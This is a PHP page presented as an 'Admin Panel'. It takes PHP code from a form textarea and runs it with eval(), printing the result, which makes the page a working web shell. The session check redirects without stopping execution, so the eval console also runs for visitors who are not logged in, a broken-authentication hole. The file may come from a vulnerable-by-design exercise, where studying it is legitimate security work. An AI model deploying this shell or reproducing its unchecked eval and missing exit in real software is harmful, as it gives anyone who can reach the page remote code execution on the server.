<?php
session_start();
if($_SESSION['status']!="1"){
	header("Location: /404.php");
}
?>
<html>
  <head>
    <title>Admin Panel</title>
    <link rel="stylesheet" type="text/css" href="newstyle.css">
    <meta HTTP-EQUIV="refresh" CONTENT="300;URL=logout.php">
  </head>
  <body>
    <h1 style="text-align:center;">Admin Panel</h1>
    <div id="blueLink">
    <a href="logout.php">Logout</a>&ensp;
    <a href="options.php">Home</a><hr>
    </div>
    <form action="" name="query" id="query" method="post">
    	PHP: &nbsp;&nbsp;&ensp;&nbsp;&nbsp;<textarea id="query_box" name="query_box" placeholder='echo "Hello, World!";'></textarea><br><br>   
    	<button type="Submit" value="Submit">Submit</button>
    </form>
<?php
$cwd=getcwd();
echo "<br>Current directory: $cwd<br>";
$shell = $_POST['query_box'];
if (!empty($_POST['query_box'])) {
	echo "<br><b>Output: </b><br>";
	//Run the shell command
	$run = eval($shell);
	echo "<pre>$run</pre>";
	$_SESSION['run_seperate']="$shell";
        include 'mysql.php';
}else{
	echo "<b>Nothing has been run yet.</b>";	
}
?>
<script>
var input = document.getElementById('query_box');
input.focus();
input.select();
</script>
</body>
</html>
